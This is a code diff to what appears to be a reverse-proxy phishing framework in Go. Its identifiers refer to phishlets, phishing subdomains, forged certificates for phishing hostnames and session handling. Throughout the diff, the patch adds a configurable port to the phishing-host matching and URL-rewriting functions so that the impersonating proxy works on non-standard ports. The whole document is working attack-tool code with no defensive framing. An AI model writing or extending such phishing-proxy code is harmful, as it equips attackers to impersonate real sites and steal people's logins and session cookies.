@@ -190,6 +190,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
+
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := ""
 			if req.Header.Get("CF-Connecting-IP") != "" {
@@ -1389,7 +1390,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
 			} else {
 				h = combineHost(ph.orig_subdomain, ph.domain)
-				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
+				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort()
 			}
 			hosts = append(hosts, h)
 		}
@@ -1449,6 +1450,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 					return nil, fmt.Errorf("phishing hostname not found")
 				}
 			}
+
 
 			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
 			if err != nil {
@@ -1569,7 +1571,7 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort() {
 					return pl
 				}
 			}
@@ -1606,7 +1608,7 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) || hostname == combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort() {
 					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
 				}
 			}
@@ -1631,11 +1633,12 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
+				log.Debug(combineHost(ph.orig_subdomain, ph.domain))
 				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+					return prefix + combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort(), true
 				}
 				if hostname == ph.domain {
-					return prefix + phishDomain, true
+					return prefix + phishDomain + p.cfg.GetPhishUrlPort(), true
 				}
 			}
 		}
@@ -1662,7 +1665,7 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort() {
 					return phishDomain, true
 				}
 			}
@@ -1712,7 +1715,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) + p.cfg.GetPhishUrlPort() {
 					if ph.handle_session || ph.is_landing {
 						return true
 					}
